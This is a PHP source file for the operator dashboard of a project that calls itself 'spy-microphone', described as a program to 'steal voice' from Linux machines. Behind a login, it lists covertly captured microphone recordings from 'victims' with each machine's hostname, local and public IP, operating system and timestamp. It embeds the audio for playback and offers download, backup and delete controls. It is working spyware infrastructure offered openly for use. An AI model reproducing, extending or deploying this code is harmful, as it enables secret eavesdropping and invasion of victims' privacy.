<?php 

#
# Copyright (c) 2018 Barchampas Gerasimos <makindosx@gmail.com>
# spy-microphone is a program for steal voice in gnu/linux OS.
#
# spy-microphone is free software: you can redistribute it and/or modify
# it under the terms of the GNU Affero General Public License as
# published by the Free Software Foundation, either version 3 of the
# License, or (at your option) any later version.
#
#
# spy-microphone is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU Affero General Public License for more details.
#
# You should have received a copy of the GNU Affero General Public License, version 3,
# along with this program.  If not, see <http://www.gnu.org/licenses/>
#

session_start();

 if (!isset($_SESSION['login']))
    {
      header("Location: index.php");
      }


?>



<html>
<head>

<link href="//maxcdn.bootstrapcdn.com/bootstrap/3.3.0/css/bootstrap.min.css" rel="stylesheet" id="bootstrap-css">
<script src="//maxcdn.bootstrapcdn.com/bootstrap/3.3.0/js/bootstrap.min.js"></script>
<script src="//code.jquery.com/jquery-1.11.1.min.js"></script>
<!------ Include the above in your HEAD tag ---------->

<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">



<script type="text/javascript">
function backup_confirm()
    {
   var result = confirm("Are you sure to backup records for this vctim?");
	if(result)
         {
         return true;
          //location.href='delete_records.php';
	    }

       else
         {
	 return false;
	    }

    } // end of function

</script>




<script type="text/javascript">
function delete_confirm()
    {
   var result = confirm("Are you sure to delete records for this vctim?");
	if(result)
         {
         return true;
          //location.href='delete_records.php';
	    }

       else
         {
	 return false;
	    }

    } // end of function

</script>







<style>
.panel
        {
          margin: 5%;
          background: transparent;
        }


        tr
        {
          transition: all 0.5s;
        }
        tr:hover
        {
          background-color: #31708F;
          transition: 0.5s;
        }
        .btn-warning
        {
          transition: all 0.8s;
        }

        .btn-warning:hover, .btn-warning:focus
        {
          transition: 0.8s;
          background-color: #31708F;
          border-color: #31708F;
        }

        .panel-footer
        {
          background-color: #31708F;
          color: white;
        }




input[type=checkbox] 
{
transform: scale(1.5);
}


#td2 
{
padding: 3px;
text-align: left;
}



</style>



</head>


<body>




<?php


 include("__SRC__/config.php");
 Class paginationClass{
  
  private $SetRecordLimit = 5 ; 
  
  // connect to mysql database... 
  public function DBConnect(){
   
   $dbhost = DB_SERVER; // set the hostname
   $dbname = DB_DATABASE ; // set the database name
   $dbuser = DB_USERNAME ; // set the mysql username
   $dbpass = DB_PASSWORD;  // set the mysql password
   
   try {
    $dbConnection = new PDO("mysql:host=$dbhost;dbname=$dbname", $dbuser, $dbpass); 
    $dbConnection->exec("set names utf8");
    $dbConnection->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
    return $dbConnection;
    
   }
   catch (PDOException $e) {
    echo 'Connection failed: ' . $e->getMessage();
   }   
  }  
  
  // Display Pagination data page wise...
  public function displayData( $pageNumber ){   
   
   $SetOffSetLimit = $pageNumber * $this->SetRecordLimit ;   
   
   try {
    $dbConnection = $this->DBConnect();
    
    $stmt = $dbConnection->prepare("SELECT * FROM records 
                                    WHERE hard_disk_id_serial_number = 'E: ID_SERIAL_SHORT=FF445F0AA'   
                                    LIMIT :SetRecordLimit OFFSET :SetOffSetLimit");
    $stmt->bindParam(':SetRecordLimit', $this->SetRecordLimit , PDO::PARAM_INT);
    $stmt->bindParam(':SetOffSetLimit', $SetOffSetLimit , PDO::PARAM_INT);
    $stmt->execute();
    
    $Count = $stmt->rowCount();     


                echo '
<div class="container-fluid">
    <div class="panel panel-info">
      <div class="panel-heading">
        <div class="row">
          <div class="col-xs-12 col-sm-12 col-md-8">
            <h2 class="text-center pull-left" style="padding-left: 30px;"> 
             <span class="glyphicon glyphicon-record"> </span> Records </h2>
          </div>
          <div class="col-xs-9 col-sm-9 col-md-9">
            <div class="col-xs-12 col-sm-12 col-md-12">
              <div class="col-xs-12 col-md-4">             
              </div>
            </div>
          </div>
        </div>
      </div> 

      <div class="panel-body table-responsive">
        <table class="table table-hover">
          <thead>
            <tr>
              <th class="text-center"> Hostname <i class="fa fa-desktop"> </i> </th>
              <th class="text-center"> IPv4 <i class="fa fa-signal"> </i> </th>
              <th class="text-center"> Public Ip <i class="fa fa-signal"> </i> </th>
              <th class="text-center"> 
                 Operating System
                 <i class="fa fa-windows"> </i>
                 <i class="fa fa-apple"> </i>
                 <i class="fa fa-linux"> </i>
              </th>
              <th class="text-center"> Instant <i class="fa fa-clock-o"> </i> </th>
              <th class="text-center"> 
                Record 
                <i class="fa fa-microphone"> </i> 
               <i class="fa fa-microphone-slash"> </i> 
              </th> 

         <th class="text-center"> 
         
           </th>

            </tr>
          </thead>

         <tbody>
            <tr class="edit" id="detail">';


    if ($Count  > 0){
     while($data=$stmt->fetch(PDO::FETCH_ASSOC)) {

       $hard_disk_id_serial_number = $data['hard_disk_id_serial_number'];

       $os_system = $data['operating_system'];
       $operating_system = strtok($os_system, '#');

       $record = '<audio controls src="data:audio/ogg;base64,' .$data['record'].'" />';


      echo " 
              <td class='text-center'> {$data['computer_name']} </td>
              <td class='text-center'> {$data['ipv4']} </td>
              <td class='text-center'> {$data['public_ip']} </td>
              <td class='text-center'> $operating_system </td>
              <td class='text-center'> {$data['instant']} </td>
              <td class='text-center'>  
                 $record      
             </td>
             
             <td>
               <a href='/download_record.php?id={$data['id']}' class='btn btn-danger btn-xs'> 
                 Download  <i class='fa fa-download'> </i
              </a>  
             </td>

            </tr>
             ";
                 

     // echo '<div id="post-data"><h4>'.$data['ipv4'].'</h4><div> '.$data['public_ip'].'</div></div>';
      
     }
    }    

    
    
      echo" 
      </tbody>
        </table>
      </div>
   <div class='panel-footer'>

              <table>
             <tr>
 
            <td>
          <form action='/backup_records.php' method='POST' onsubmit='return backup_confirm();'>

            <font size='4'>
                <i class='fa fa-hdd-o'> </i> Backup Records --> 
             </font>

      <input type='submit' name='backup_records_hard_disk' value='$hard_disk_id_serial_number' 
        class='btn btn-success btn-md'> 
         </form>
        
            </td>

 
             <td> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </td>
             <td> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </td>
             <td> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </td>
   

             <td>
          <form action='/delete_records.php' method='POST' onsubmit='return delete_confirm();'>

            <font size='4'>
                <i class='fa fa-trash'> </i> Delete Records --> 
             </font>

      <input type='submit' name='delete_hard_disk_id_serial_number' value='$hard_disk_id_serial_number' 
        class='btn btn-danger btn-md'> 
         </form>
          
           </td>

           </tr>  
           </table>

        <div class='row'>
         
        </div>
      </div>
    </div>
  </div>
  <div id=''>";


   }
   catch (PDOException $e) {
    echo 'Connection failed: ' . $e->getMessage();
   } 
  }  
  // Get the Total Number Records...
  public function getTotalNumberOfRecords(){
   
   try {
    $dbConnection = $this->DBConnect();
    
    $stmt = $dbConnection->prepare('SELECT * FROM records');
    
    $stmt->execute();
    
    $Count = $stmt->rowCount();     
    if ($Count  > 0){
     echo $total_groups = ceil($Count/$this->SetRecordLimit);     
     } else{
     echo "0" ;
    }
   }   
   catch (PDOException $e) {
    echo 'Connection failed: ' . $e->getMessage();
   }   
  } 
  
 } 
 
?>

 
           


</body>
</html>
